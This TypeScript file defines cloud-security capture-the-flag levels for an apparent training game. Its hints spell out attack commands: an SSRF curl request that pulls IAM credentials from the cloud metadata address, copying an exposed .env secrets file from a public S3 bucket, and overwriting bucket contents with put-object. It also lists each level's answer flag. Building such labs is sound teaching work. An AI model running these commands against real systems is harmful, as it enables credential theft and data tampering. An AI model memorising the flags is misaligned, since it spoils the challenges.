import { Level } from '.';

export const cloud: Level[] = [
  {
    id: '16',
    title: 'Cloud Bucket Leakage',
    category: 'Cloud Security',
    description:
      'A public S3 bucket is over-sharing assets. List its contents and find the exposed secret.',
    objective: 'List the S3 bucket and retrieve the .env file.',
    target: 's3://company-public-assets/',
    type: 'terminal',
    flag: 'FLAG{s3_bucket_leak}',
    xp: 100,
    hints: ['Run `aws s3 ls s3://company-public-assets/`', 'Try `aws s3 cp s3://.../.env .`'],
  },
  {
    id: '21',
    title: 'SSRF - Cloud Metadata',
    category: 'Cloud Security',
    description:
      'A stock-ticker proxy accepts arbitrary URLs. Force the backend to request the cloud metadata service.',
    objective:
      'Use curl to fetch the IMDS endpoint through the vulnerable proxy and leak the IAM credentials.',
    target: 'http://target/fetch?url=',
    type: 'terminal',
    flag: 'FLAG{ssrf_cloud_metadata}',
    xp: 100,
    hints: [
      'Try `curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"`',
      'Cloud metadata lives at the link-local address 169.254.169.254.',
    ],
  },
  {
    id: '30',
    title: 'S3 Public Write',
    category: 'Cloud Security',
    description:
      'A bucket policy allows public PutObject. Abuse it to overwrite an exposed config file.',
    objective: 'List the bucket and use aws s3api put-object to trigger the exposed write flag.',
    target: 's3://public-assets-backup/',
    type: 'terminal',
    flag: 'FLAG{s3_public_wr1te_4cl}',
    xp: 140,
    hints: [
      'Run `aws s3 ls s3://public-assets-backup/`',
      'Then use `aws s3api put-object` to overwrite the bucket index.',
    ],
  },
];
